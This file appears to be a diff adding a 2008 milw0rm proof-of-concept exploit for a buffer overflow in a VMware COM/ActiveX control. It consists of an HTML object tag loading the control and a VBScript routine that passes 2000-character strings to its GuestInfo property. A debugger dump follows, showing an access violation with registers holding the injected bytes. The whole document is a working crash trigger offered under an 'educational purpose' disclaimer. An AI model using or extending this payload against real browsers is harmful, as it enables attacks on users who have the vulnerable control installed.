@@ -1,0 +1,59 @@
+-----------------------------------------------------------------------------
+ VMWare COM API Buffer Overflow
+ url: http://www.vmware.com/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.net
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on Windows XP Professional SP3 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+<object classid='clsid:38DB77F9-058D-4955-98AA-4A9F3B6A5B06' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+ Sub tryMe
+  buff_1 = String (2000, "a")
+  buff_2 = String (2000, "b")
+  test.GuestInfo (buff_1) = buff_2
+ End Sub
+</script>
+
+Dump:
+09:25:39.339  pid=0640 tid=0504  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [00000070])
+              ----------------------------------------------------------------
+              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=0012BE14: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
+              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=002F8010: 00 00 00 00 00 00 00 00-00 00 00 00 00 0E 27 07
+              ESP=0012BDE4: 00 BE 12 00 17 AC A5 02-00 00 00 00 00 00 00 00
+              EBP=0012BDE4: 00 BE 12 00 17 AC A5 02-00 00 00 00 00 00 00 00
+              ESI=002F8010: 00 00 00 00 00 00 00 00-00 00 00 00 00 0E 27 07
+              EDI=0012CDB8: 62 62 62 62 62 62 62 62-62 62 62 62 62 62 62 62
+              EIP=02A6CBBF: 8B 51 70 8B 02 5D C3 90-90 90 90 90 90 90 90 90
+                            --> MOV EDX,[ECX+70]
+              ----------------------------------------------------------------
+
+09:25:39.339  pid=0640 tid=0504  EXCEPTION (unhandled)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [00000070])
+              ----------------------------------------------------------------
+              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=0012BE14: 61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61
+              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=002F8010: 00 00 00 00 00 00 00 00-00 00 00 00 00 0E 27 07
+              ESP=0012BDE4: 00 BE 12 00 17 AC A5 02-00 00 00 00 00 00 00 00
+              EBP=0012BDE4: 00 BE 12 00 17 AC A5 02-00 00 00 00 00 00 00 00
+              ESI=002F8010: 00 00 00 00 00 00 00 00-00 00 00 00 00 0E 27 07
+              EDI=0012CDB8: 62 62 62 62 62 62 62 62-62 62 62 62 62 62 62 62
+              EIP=02A6CBBF: 8B 51 70 8B 02 5D C3 90-90 90 90 90 90 90 90 90
+                            --> MOV EDX,[ECX+70]
+              ----------------------------------------------------------------
+
+# milw0rm.com [2008-09-01]
